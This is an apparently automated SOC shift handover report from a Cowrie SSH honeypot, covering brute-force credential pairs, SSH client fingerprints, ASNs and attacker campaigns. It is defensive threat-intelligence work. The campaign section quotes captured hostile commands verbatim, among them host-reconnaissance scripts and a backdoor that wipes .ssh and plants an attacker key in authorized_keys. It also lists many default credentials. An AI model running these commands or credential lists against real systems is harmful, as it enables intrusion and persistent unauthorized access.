# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-10 |
| **Generated At** | 2026-07-10T17:51:36Z |
| **Shift Time** | 17:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **761** |
| Confirmed Threats | **728** |
| False Positives Filtered | **33** (4.3%) |
| Unique Attacker IPs | **172** |
| Countries of Origin | **34** |
| High Severity Cases | **231** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **530** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **286** |
| Unique Credential Pairs | **150** |
| Unique Usernames | **34** |
| Unique Passwords | **139** |
| Successful Auth Pairs | **238** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 87 |
| `support` | 32 |
| `test` | 27 |
| `default` | 19 |
| `admin` | 16 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 23 |
| `admin` | 7 |
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `nobody4` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 23 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `admin` | `admin` | 6 |
| `nobody` | `nobody4` | 6 |
| `Root` | `Root2010` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `test` | `qwe123` | `91.92.40.204` | 2026-07-10T12:55:57 |
| `test` | `qwer1234` | `91.92.40.204` | 2026-07-10T12:57:12 |
| `root` | `Pass1234567` | `45.198.224.120` | 2026-07-10T12:57:39 |
| `test` | `password123` | `91.92.40.204` | 2026-07-10T12:58:27 |
| `test` | `qwerty123456` | `91.92.40.204` | 2026-07-10T12:59:39 |
| `test` | `1234qwer` | `91.92.40.204` | 2026-07-10T13:00:55 |
| `test` | `123qwe` | `91.92.40.204` | 2026-07-10T13:02:10 |
| `test` | `passpass` | `91.92.40.204` | 2026-07-10T13:03:25 |
| `test` | `pass123` | `91.92.40.204` | 2026-07-10T13:04:41 |
| `root` | `Temp2025` | `160.119.69.14` | 2026-07-10T13:05:17 |
| `345gs5662d34` | `345gs5662d34` | `160.119.69.14` | 2026-07-10T13:05:20 |
| `root` | `3245gs5662d34` | `160.119.69.14` | 2026-07-10T13:05:20 |
| `test` | `pass1234` | `91.92.40.204` | 2026-07-10T13:05:53 |
| `test` | `wasd` | `91.92.40.204` | 2026-07-10T13:07:07 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-10T13:07:10 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-10T13:07:10 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-10T13:07:16 |
| `support` | `support` | `176.53.159.196` | 2026-07-10T13:07:59 |
| `test` | `qwerty` | `91.92.40.204` | 2026-07-10T13:08:22 |
| `root` | `qazzaq224466` | `45.198.224.120` | 2026-07-10T13:09:17 |
| `test` | `q1w2e3` | `91.92.40.204` | 2026-07-10T13:09:36 |
| `test` | `q1w2e3r4` | `91.92.40.204` | 2026-07-10T13:10:51 |
| `operator` | `operator00` | `10.0.0.73` | 2026-07-10T13:11:16 |
| `test` | `1q2w3e` | `91.92.40.204` | 2026-07-10T13:12:05 |
| `test` | `1q2w3e4r` | `91.92.40.204` | 2026-07-10T13:13:19 |
| `User` | `1qaz2wsx` | `119.202.139.244` | 2026-07-10T13:14:18 |
| `User` | `1qaz2wsx` | `116.48.143.166` | 2026-07-10T13:14:32 |
| `test` | `111111` | `91.92.40.204` | 2026-07-10T13:14:35 |
| `config` | `config3` | `187.8.120.90` | 2026-07-10T13:14:56 |
| `config` | `config3` | `77.223.122.29` | 2026-07-10T13:15:09 |
| `test` | `qwerty123` | `91.92.40.204` | 2026-07-10T13:15:49 |
| `test` | `123321` | `91.92.40.204` | 2026-07-10T13:17:01 |
| `User` | `1qaz2wsx` | `182.75.197.174` | 2026-07-10T13:17:47 |
| `User` | `1qaz2wsx` | `41.214.10.178` | 2026-07-10T13:17:54 |
| `test` | `321123` | `91.92.40.204` | 2026-07-10T13:18:13 |
| `config` | `config3` | `92.126.223.175` | 2026-07-10T13:18:20 |
| `config` | `config3` | `61.12.84.172` | 2026-07-10T13:18:30 |
| `test` | `p@ssw0rd` | `91.92.40.204` | 2026-07-10T13:19:25 |
| `root` | `qqqq` | `45.198.224.120` | 2026-07-10T13:20:47 |
| `test` | `test444` | `183.233.85.194` | 2026-07-10T13:32:43 |
| `admin` | `admin` | `104.194.10.143` | 2026-07-10T13:35:39 |
| `telnetadmin` | `telnetadmin` | `104.194.10.143` | 2026-07-10T13:35:56 |
| `root` | `Pon521` | `104.194.10.143` | 2026-07-10T13:36:08 |
| `test` | `test444` | `101.13.4.119` | 2026-07-10T13:36:12 |
| `guest` | `12345` | `104.194.10.143` | 2026-07-10T13:36:20 |
| `test` | `test444` | `102.90.34.90` | 2026-07-10T13:36:24 |
| `root` | `root621` | `104.194.10.143` | 2026-07-10T13:36:31 |
| `test` | `test444` | `10.0.0.73` | 2026-07-10T13:36:33 |
| `admin` | `GeNeXiS@19` | `104.194.10.143` | 2026-07-10T13:36:43 |
| `nobody` | `nobody` | `104.194.10.143` | 2026-07-10T13:36:55 |
| `guest` | `guest` | `104.194.10.143` | 2026-07-10T13:37:07 |
| `chinadsl-net` | `system` | `104.194.10.143` | 2026-07-10T13:37:19 |
| `root` | `system` | `104.194.10.143` | 2026-07-10T13:37:30 |
| `user` | `user` | `104.194.10.143` | 2026-07-10T13:37:42 |
| `root` | `vizxv` | `104.194.10.143` | 2026-07-10T13:37:54 |
| `root` | `Zte521` | `104.194.10.143` | 2026-07-10T13:38:06 |
| `root` | `oelinux123` | `104.194.10.143` | 2026-07-10T13:38:18 |
| `bin` | `bin` | `104.194.10.143` | 2026-07-10T13:38:42 |
| `admin` | `BrAhMoS@15` | `104.194.10.143` | 2026-07-10T13:38:56 |
| `daemon` | `daemon` | `104.194.10.143` | 2026-07-10T13:39:08 |
| `telecomadmin` | `admintelecom` | `104.194.10.143` | 2026-07-10T13:39:19 |
| `admin` | `1234` | `104.194.10.143` | 2026-07-10T13:39:32 |
| `default` | `default` | `104.194.10.143` | 2026-07-10T13:39:44 |
| `Test` | `111` | `220.246.41.171` | 2026-07-10T13:39:51 |
| `default` | `lJwpbo6` | `104.194.10.143` | 2026-07-10T13:39:56 |
| `Test` | `111` | `128.199.118.234` | 2026-07-10T13:40:04 |
| `default` | `tlJwpbo6` | `104.194.10.143` | 2026-07-10T13:40:09 |
| `default` | `S2fGqNFs` | `104.194.10.143` | 2026-07-10T13:40:21 |
| `default` | `1cDuLJ7c` | `104.194.10.143` | 2026-07-10T13:40:33 |
| `default` | `OxhlwSG8` | `104.194.10.143` | 2026-07-10T13:40:45 |
| `root` | `xc3511` | `104.194.10.143` | 2026-07-10T13:40:58 |
| `default` | `12345` | `104.194.10.143` | 2026-07-10T13:41:10 |
| `blank` | `blank22` | `170.233.29.157` | 2026-07-10T13:41:16 |
| `default` | `tluafed` | `104.194.10.143` | 2026-07-10T13:41:23 |
| `support` | `support` | `104.194.10.143` | 2026-07-10T13:41:35 |
| `yhtcAdmin` | `Cm1@YHfw` | `104.194.10.143` | 2026-07-10T13:41:47 |
| `yhtcAdmin` | `Cuc@YHfw` | `104.194.10.143` | 2026-07-10T13:42:00 |
| `ftp` | `ftp` | `104.194.10.143` | 2026-07-10T13:42:21 |
| `root` | `default` | `104.194.10.143` | 2026-07-10T13:42:33 |
| `root` | `Fireitup` | `104.194.10.143` | 2026-07-10T13:42:46 |
| `root` | `solokey` | `104.194.10.143` | 2026-07-10T13:42:59 |
| `debian` | `debian6` | `45.118.49.18` | 2026-07-10T13:43:12 |
| `root` | `icatch99` | `104.194.10.143` | 2026-07-10T13:43:12 |
| `debian` | `debian6` | `176.36.139.231` | 2026-07-10T13:43:19 |
| `root` | `tsgoingon` | `104.194.10.143` | 2026-07-10T13:43:25 |
| `root` | `admin` | `104.194.10.143` | 2026-07-10T13:43:38 |
| `guest` | `123456` | `104.194.10.143` | 2026-07-10T13:43:50 |
| `root` | `1001chin` | `104.194.10.143` | 2026-07-10T13:44:03 |
| `root` | `unisheen` | `104.194.10.143` | 2026-07-10T13:44:16 |
| `root` | `xirtam` | `104.194.10.143` | 2026-07-10T13:44:29 |
| `root` | `a1sev5y7c39k` | `104.194.10.143` | 2026-07-10T13:44:41 |
| `blank` | `blank22` | `61.12.86.90` | 2026-07-10T13:44:46 |
| `admin` | `admin123` | `104.194.10.143` | 2026-07-10T13:44:55 |
| `blank` | `blank22` | `65.20.191.231` | 2026-07-10T13:44:56 |
| `root` | `zlxx.` | `104.194.10.143` | 2026-07-10T13:45:08 |
| `blank` | `blank22` | `10.0.0.73` | 2026-07-10T13:45:15 |
| `root` | `antslq` | `104.194.10.143` | 2026-07-10T13:45:20 |
| `root` | `Zxic521` | `104.194.10.143` | 2026-07-10T13:45:37 |
| `admin` | `12345` | `104.194.10.143` | 2026-07-10T13:45:51 |
| `root` | `/*6.=_ja` | `104.194.10.143` | 2026-07-10T13:46:05 |
| `root` | `12345` | `104.194.10.143` | 2026-07-10T13:46:21 |
| `root` | `070admin` | `104.194.10.143` | 2026-07-10T13:46:34 |
| `root` | `hkipc2016` | `104.194.10.143` | 2026-07-10T13:46:48 |
| `ubnt` | `1234` | `45.198.224.120` | 2026-07-10T13:50:52 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-10T13:53:36 |
| `debian` | `temppwd` | `24.142.170.231` | 2026-07-10T13:58:38 |
| `GET /cgi-bin/authLogin.cgi HTTP/1.1` | `Host: 129.80.119.236:23` | `139.59.154.49` | 2026-07-10T14:01:14 |
| `nobody` | `nobody4` | `211.252.94.151` | 2026-07-10T14:04:23 |
| `nobody` | `nobody4` | `124.160.45.26` | 2026-07-10T14:04:37 |
| `ubnt` | `ubnt2005` | `103.112.224.81` | 2026-07-10T14:05:51 |
| `ubnt` | `ubnt2005` | `156.238.86.2` | 2026-07-10T14:06:02 |
| `default` | `123123123` | `60.214.127.246` | 2026-07-10T14:07:24 |
| `nobody` | `nobody4` | `222.190.110.210` | 2026-07-10T14:07:55 |
| `root` | `Testing1` | `45.198.224.120` | 2026-07-10T14:07:55 |
| `nobody` | `nobody4` | `220.80.223.144` | 2026-07-10T14:08:05 |
| `nobody` | `nobody4` | `10.0.0.73` | 2026-07-10T14:08:17 |
| `ubnt` | `ubnt2005` | `10.0.0.73` | 2026-07-10T14:09:42 |
| `default` | `123123123` | `62.183.82.70` | 2026-07-10T14:10:44 |
| `default` | `123123123` | `182.156.35.238` | 2026-07-10T14:10:55 |
| `default` | `123123123` | `10.0.0.73` | 2026-07-10T14:11:04 |
| `admin` | `admin` | `47.253.5.130` | 2026-07-10T14:14:43 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-10T14:14:44 |
| `oracle` | `oracle@123` | `45.198.224.120` | 2026-07-10T14:19:30 |
| `root` | `yes` | `10.0.0.73` | 2026-07-10T14:20:00 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-10T14:20:03 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T14:20:04 |
| `user5` | `123` | `14.225.206.187` | 2026-07-10T14:23:52 |
| `345gs5662d34` | `345gs5662d34` | `14.225.206.187` | 2026-07-10T14:23:57 |
| `user5` | `3245gs5662d34` | `14.225.206.187` | 2026-07-10T14:24:01 |
| `testuser` | `testuser123` | `185.242.3.195` | 2026-07-10T14:25:35 |
| `user` | `654321` | `10.0.0.73` | 2026-07-10T14:25:53 |
| `root` | `end123` | `10.0.0.73` | 2026-07-10T14:26:02 |
| `testuser` | `testuser123` | `10.0.0.73` | 2026-07-10T14:26:27 |
| `root` | `excalibur` | `118.196.30.45` | 2026-07-10T14:26:46 |
| `debian` | `debian1234567890` | `10.0.0.73` | 2026-07-10T14:28:20 |
| `guest` | `asdfgh` | `122.176.21.104` | 2026-07-10T14:29:13 |
| `root` | `Pa$$w0rd444` | `185.242.3.195` | 2026-07-10T14:29:42 |
| `test` | `test0` | `39.183.162.243` | 2026-07-10T14:31:58 |
| `test` | `test0` | `58.57.154.146` | 2026-07-10T14:32:13 |
| `supervisor` | `uploader` | `196.189.126.10` | 2026-07-10T14:33:16 |
| `test` | `test0` | `10.0.0.73` | 2026-07-10T14:35:35 |
| `supervisor` | `uploader` | `62.201.253.23` | 2026-07-10T14:36:38 |
| `supervisor` | `uploader` | `94.205.250.78` | 2026-07-10T14:36:46 |
| `supervisor` | `uploader` | `10.0.0.73` | 2026-07-10T14:37:05 |
| `admin` | `aA123456.` | `185.225.41.192` | 2026-07-10T14:45:36 |
| `345gs5662d34` | `345gs5662d34` | `185.225.41.192` | 2026-07-10T14:45:40 |
| `admin` | `3245gs5662d34` | `185.225.41.192` | 2026-07-10T14:45:41 |
| `root` | `129.80.119.236` | `106.12.38.73` | 2026-07-10T14:47:31 |
| `root` | `Pa$$w0rd444` | `10.0.0.73` | 2026-07-10T14:53:21 |
| `supervisor` | `maintenance` | `213.230.65.53` | 2026-07-10T14:53:39 |
| `supervisor` | `maintenance` | `210.0.90.82` | 2026-07-10T14:53:49 |
| `supervisor` | `33333` | `189.56.0.19` | 2026-07-10T14:54:03 |
| `supervisor` | `33333` | `180.183.245.232` | 2026-07-10T14:54:18 |
| `joshua` | `joshua` | `45.198.224.120` | 2026-07-10T14:54:50 |
| `supervisor` | `33333` | `10.0.0.73` | 2026-07-10T14:57:50 |
| `root` | `159357` | `185.15.189.232` | 2026-07-10T14:58:53 |
| `root` | `159357` | `78.187.230.168` | 2026-07-10T14:58:59 |
| `unknown` | `webmaster` | `213.33.204.130` | 2026-07-10T15:01:14 |
| `unknown` | `webmaster` | `10.0.0.73` | 2026-07-10T15:01:36 |
| `root` | `159357` | `121.189.226.81` | 2026-07-10T15:02:31 |
| `root` | `159357` | `101.13.5.50` | 2026-07-10T15:02:44 |
| `root` | `zag12wsx` | `185.242.3.195` | 2026-07-10T15:06:08 |
| `a3` | `a3` | `45.198.224.120` | 2026-07-10T15:10:31 |
| `admin` | `Huawei12#$` | `200.232.114.71` | 2026-07-10T15:15:42 |
| `admin` | `Huawei12#$` | `196.189.59.226` | 2026-07-10T15:15:51 |
| `Root` | `Root2010` | `59.23.20.15` | 2026-07-10T15:18:46 |
| `Root` | `Root2010` | `14.48.112.8` | 2026-07-10T15:18:55 |
| `admin` | `Huawei12#$` | `10.0.0.73` | 2026-07-10T15:19:27 |
| `Root` | `Root2010` | `187.115.144.103` | 2026-07-10T15:22:09 |
| `Root` | `Root2010` | `182.79.218.101` | 2026-07-10T15:22:18 |
| `Root` | `Root2010` | `10.0.0.73` | 2026-07-10T15:22:37 |
| `default` | `default22` | `121.189.198.60` | 2026-07-10T15:23:17 |
| `default` | `default22` | `178.178.194.128` | 2026-07-10T15:23:25 |
| `dietpi` | `dietpi` | `65.20.204.88` | 2026-07-10T15:24:40 |
| `dietpi` | `dietpi` | `117.177.235.249` | 2026-07-10T15:24:51 |
| `root` | `Passwd@1234` | `45.198.224.120` | 2026-07-10T15:25:51 |
| `default` | `default22` | `196.216.81.126` | 2026-07-10T15:26:37 |
| `default` | `default22` | `180.71.9.31` | 2026-07-10T15:26:50 |
| `default` | `default22` | `10.0.0.73` | 2026-07-10T15:27:02 |
| `dietpi` | `dietpi` | `61.37.150.6` | 2026-07-10T15:28:01 |
| `dietpi` | `dietpi` | `218.248.19.102` | 2026-07-10T15:28:15 |
| `dietpi` | `dietpi` | `10.0.0.73` | 2026-07-10T15:28:22 |
| `root` | `zag12wsx` | `10.0.0.73` | 2026-07-10T15:29:12 |
| `root` | `root22` | `203.192.211.180` | 2026-07-10T15:40:58 |
| `root` | `qw` | `45.198.224.120` | 2026-07-10T15:41:03 |
| `root` | `QWERqwer123` | `185.242.3.195` | 2026-07-10T15:41:51 |
| `root` | `1978` | `218.37.114.205` | 2026-07-10T15:43:20 |
| `root` | `root22` | `85.152.57.60` | 2026-07-10T15:44:36 |
| `root` | `root22` | `122.170.111.140` | 2026-07-10T15:44:48 |
| `root` | `1978` | `10.0.0.73` | 2026-07-10T15:47:06 |
| `supervisor` | `supervisor9` | `10.0.0.73` | 2026-07-10T15:52:40 |
| `support` | `support3` | `65.181.79.60` | 2026-07-10T15:53:33 |
| `root` | `qwerty123456` | `45.198.224.120` | 2026-07-10T15:59:10 |
| `root` | `Pa55word!` | `103.182.132.154` | 2026-07-10T16:00:25 |
| `345gs5662d34` | `345gs5662d34` | `103.182.132.154` | 2026-07-10T16:00:30 |
| `root` | `3245gs5662d34` | `103.182.132.154` | 2026-07-10T16:00:32 |
| `root` | `QWERqwer123` | `10.0.0.73` | 2026-07-10T16:04:21 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-10T16:05:34 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-10T16:05:35 |
| `unknown` | `unknown123456789` | `177.159.150.111` | 2026-07-10T16:08:10 |
| `root` | `2wsxcde3admin` | `2.58.172.185` | 2026-07-10T16:08:17 |
| `unknown` | `unknown123456789` | `221.120.4.61` | 2026-07-10T16:08:22 |
| `root` | `counter` | `10.0.0.73` | 2026-07-10T16:10:37 |
| `unknown` | `unknown123456789` | `111.70.32.5` | 2026-07-10T16:11:43 |
| `unknown` | `unknown123456789` | `10.0.0.73` | 2026-07-10T16:12:11 |
| `root` | `jobandtalent` | `45.198.224.120` | 2026-07-10T16:14:11 |
| `support` | `1123456` | `58.22.255.28` | 2026-07-10T16:14:24 |
| `root` | `root222` | `65.20.141.202` | 2026-07-10T16:15:31 |
| `root` | `root222` | `111.46.77.2` | 2026-07-10T16:15:45 |
| `mark` | `mark` | `185.242.3.195` | 2026-07-10T16:16:44 |
| `support` | `1123456` | `201.28.237.90` | 2026-07-10T16:17:52 |
| `support` | `1123456` | `121.189.226.81` | 2026-07-10T16:18:01 |
| `support` | `1123456` | `10.0.0.73` | 2026-07-10T16:18:18 |
| `root` | `root222` | `120.224.15.67` | 2026-07-10T16:19:08 |
| `root` | `root222` | `211.253.10.61` | 2026-07-10T16:19:17 |
| `root` | `root222` | `10.0.0.73` | 2026-07-10T16:19:31 |
| `support` | `support` | `10.0.0.73` | 2026-07-10T16:20:44 |
| `root` | `Root.2019` | `45.198.224.120` | 2026-07-10T16:29:41 |
| `root` | `﻿------fuck------` | `52.170.194.23` | 2026-07-10T16:30:18 |
| `support` | `Azerty01` | `65.20.233.110` | 2026-07-10T16:32:13 |
| `support` | `Azerty01` | `45.181.101.95` | 2026-07-10T16:32:20 |
| `blank` | `blank44` | `62.140.234.114` | 2026-07-10T16:33:55 |
| `blank` | `blank44` | `93.4.16.74` | 2026-07-10T16:34:03 |
| `support` | `Azerty01` | `10.0.0.73` | 2026-07-10T16:36:09 |
| `root` | `Qwe2024@` | `10.0.0.73` | 2026-07-10T16:37:08 |
| `blank` | `blank44` | `113.140.95.2` | 2026-07-10T16:37:28 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-10T16:37:35 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-10T16:37:35 |
| `mark` | `mark` | `10.0.0.73` | 2026-07-10T16:38:44 |
| `supervisor` | `supervisor5` | `178.178.222.58` | 2026-07-10T16:39:48 |
| `admin` | `admin` | `47.77.216.159` | 2026-07-10T16:40:56 |
| `user` | `letmein` | `200.105.141.172` | 2026-07-10T16:41:05 |
| `user` | `letmein` | `41.224.62.206` | 2026-07-10T16:41:12 |
| `root` | `Password02*` | `45.198.224.120` | 2026-07-10T16:41:26 |
| `supervisor` | `supervisor5` | `10.0.0.73` | 2026-07-10T16:43:52 |
| `user` | `letmein` | `10.0.0.73` | 2026-07-10T16:45:06 |
| `root` | `victoria` | `185.242.3.195` | 2026-07-10T16:50:45 |
| `root` | `` | `94.154.43.41` | 2026-07-10T16:53:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **761** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 83 |
| Go SSH scanner | 75 |
| libssh | 31 |
| Paramiko (Python) | 10 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 83 | 82 |
| `16443846184e...` | Generic scanner | 25 | 3 |
| `eff4c24daffc...` | Modern SSH client | 21 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 20 | 1 |
| `f555226df196...` | Mirai/variant | 14 | 6 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 83 | 82 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 25 | 3 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 21 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 20 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 15 | 5 | — |
| `f555226df196...` | libssh | 14 | 6 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 6 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **11** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 20 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.204`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.41`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.225.206.187`, `103.182.132.154`, `160.119.69.14`, `185.225.41.192`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **172** |
| Unique ASNs | **91** |
| High-Risk ASNs | **81** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 12 | MEDIUM |
| `AS4766` | Korea Telecom | 10 | HIGH |
| `AS22773` | Cox Communications Inc. | 9 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 8 | HIGH |
| `AS398324` | Censys, Inc. | 8 | HIGH |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (230)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-579ad3df40c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:55 |
| **Last Seen** | 2026-07-10 12:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:55:56` | `cowrie.session.connect` |
| `2026-07-10 12:55:56` | `cowrie.client.version` |
| `2026-07-10 12:55:56` | `cowrie.client.kex` |
| `2026-07-10 12:55:57` | `cowrie.login.success` |
| `2026-07-10 12:55:58` | `cowrie.session.params` |
| `2026-07-10 12:55:58` | `cowrie.command.input` |
| `2026-07-10 12:55:58` | `cowrie.command.input` |
| `2026-07-10 12:55:58` | `cowrie.command.input` |
| `2026-07-10 12:55:58` | `cowrie.command.input` |
| `2026-07-10 12:55:58` | `cowrie.command.input` |
| `2026-07-10 12:55:58` | `cowrie.command.success` |
| `2026-07-10 12:55:58` | `cowrie.command.input` |
| `2026-07-10 12:55:58` | `cowrie.command.input` |
| `2026-07-10 12:55:58` | `cowrie.command.input` |
| `2026-07-10 12:55:58` | `cowrie.command.input` |
| `2026-07-10 12:55:59` | `cowrie.log.closed` |
| `2026-07-10 12:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db03196ee395

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:57 |
| **Last Seen** | 2026-07-10 12:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:57:11` | `cowrie.session.connect` |
| `2026-07-10 12:57:11` | `cowrie.client.version` |
| `2026-07-10 12:57:11` | `cowrie.client.kex` |
| `2026-07-10 12:57:12` | `cowrie.login.success` |
| `2026-07-10 12:57:13` | `cowrie.session.params` |
| `2026-07-10 12:57:13` | `cowrie.command.input` |
| `2026-07-10 12:57:13` | `cowrie.command.input` |
| `2026-07-10 12:57:13` | `cowrie.command.input` |
| `2026-07-10 12:57:13` | `cowrie.command.input` |
| `2026-07-10 12:57:13` | `cowrie.command.input` |
